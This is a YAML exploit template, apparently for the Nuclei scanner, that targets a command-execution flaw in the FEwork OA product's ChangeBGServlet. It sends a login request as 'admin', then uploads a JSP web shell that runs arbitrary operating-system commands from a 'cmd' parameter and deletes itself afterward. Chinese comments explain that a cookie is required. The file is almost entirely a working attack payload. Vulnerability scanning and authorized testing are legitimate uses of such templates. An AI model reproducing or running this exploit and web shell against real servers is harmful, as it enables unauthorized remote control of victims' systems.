id: poc-crsl5fn2osck93gg
info:
  name: 飞企互联OA FEwork ChangeBGServlet 存在命令执行漏洞
  author: hacktwo
  severity: critical
  description: ''
  tags: rce,2025
http:
- raw:
  - 'POST /mobileKey HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) Chrome/88.0.772.137 Safari/537.36

    Content-Type: application/x-www-form-urlencoded


    userName=admin


    携带cookie上传文件'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /servlet/ChangeBGServlet HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36

    Cookie:

    Connection: close

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk


    ------WebKitFormBoundaryKNt0t4vBe8cX9rZk

    Content-Disposition: form-data; name="file"; filename="test.jsp"

    Content-Type: text/plain


    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

    ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--


    PS：回显了完整绝对路径，验证得加cookie'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
